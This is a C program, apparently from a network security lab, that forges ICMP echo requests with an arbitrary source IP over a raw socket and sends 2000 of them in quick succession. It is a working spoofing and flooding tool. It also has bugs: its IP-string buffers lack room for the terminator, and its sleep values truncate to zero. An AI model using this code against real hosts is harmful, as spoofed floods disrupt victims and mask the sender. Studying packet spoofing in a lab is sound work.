#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address
  struct  in_addr    iph_destip;   //Destination IP address
};

/* ICMP Header  */
struct icmpheader {
  unsigned char icmp_type; // ICMP message type
  unsigned char icmp_code; // Error code
  unsigned short int icmp_chksum; //Checksum for ICMP Header and data
  unsigned short int icmp_id;     //Used for identifying request
  unsigned short int icmp_seq;    //Sequence number
};

unsigned short in_cksum (unsigned short *buf, int length)
{
   unsigned short *w = buf;
   int nleft = length;
   int sum = 0;
   unsigned short temp=0;

   /*
    * The algorithm uses a 32 bit accumulator (sum), adds
    * sequential 16 bit words to it, and at the end, folds back all
    * the carry bits from the top 16 bits into the lower 16 bits.
    */
   while (nleft > 1)  {
       sum += *w++;
       nleft -= 2;
   }

   /* treat the odd byte at the end, if any */
   if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
   }

   /* add back carry outs from top 16 bits to low 16 bits */
   sum = (sum >> 16) + (sum & 0xffff);  // add hi 16 to low 16
   sum += (sum >> 16);                  // add carry
   return (unsigned short)(~sum);
}
void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(sock < 0){
        printf("Sock open problem\n");
       // printf("%s\n",explain_socket(AF_INET, SOCK_RAW, IPPROTO_RAW));
    }

    // Step 2: Set socket option.
    int setopt = setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                     &enable, sizeof(enable));
    if(setopt < 0){
        printf("Set ERROR\n");
    }
    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    //printf("The ip header length -> %d\n",ntohs(ip->iph_len));
    int sendopt =  sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));

    if(sendopt < 0){
        printf("Send ERROR\n");
    }
    close(sock);
}

/******************************************************************
  Spoof an ICMP echo request using an arbitrary source IP Address
*******************************************************************/
int main(int argc, char *argv[]) {
   char buffer[2000];

   if(argc < 3){
    printf("Format = ./<file_name>, <sender_ip>, <reciever_ip>\n");
    exit(1);
   }
   char sender_ip[strlen(argv[1])];
   strcpy(sender_ip,argv[1]);

   char destination_ip[strlen(argv[2])];
   strcpy(destination_ip,argv[2]);

   printf("Sender IP : %s, Destination IP : %s\n",sender_ip,destination_ip);

   memset(buffer, 0, 2000);

   strcpy(buffer + sizeof(struct icmpheader) + sizeof(struct ipheader),"This is nice");
   /*********************************************************
      Step 1: Fill in the ICMP header.
    ********************************************************/
   struct icmpheader *icmp = (struct icmpheader *)
                             (buffer + sizeof(struct ipheader));
   icmp->icmp_type = 8; //ICMP Type: 8 is request, 0 is reply.

   // Calculate the checksum for integrity
   icmp->icmp_chksum = 0;
   icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
                                 sizeof(struct icmpheader) + strlen("This is nice"));

   //printf("icmp_chksum -> %d\n",ntohs(icmp->icmp_chksum)); //network to host, big endian-> little //dorkar nai.

   /*********************************************************
      Step 2: Fill in the IP header.
    ********************************************************/
   struct ipheader *ip = (struct ipheader *) buffer;
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 200; //normal 64
   ip->iph_sourceip.s_addr = inet_addr(sender_ip);
   ip->iph_destip.s_addr = inet_addr(destination_ip);
   ip->iph_protocol = IPPROTO_ICMP;
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct icmpheader)+strlen("This is nice"));

    unsigned int time_to_sleep = 0.5; //same as ttl
   /*********************************************************
      Step 3: Finally, send the spoofed packet
    ********************************************************/
   for(int i = 0; i < 2000; i++){
    printf("Sending packet -> %d\n",(i+1));
    send_raw_ip_packet (ip);
    while(time_to_sleep){

      time_to_sleep = sleep(time_to_sleep);
    }
    time_to_sleep = 0.2;
   }
   

   return 0;
}

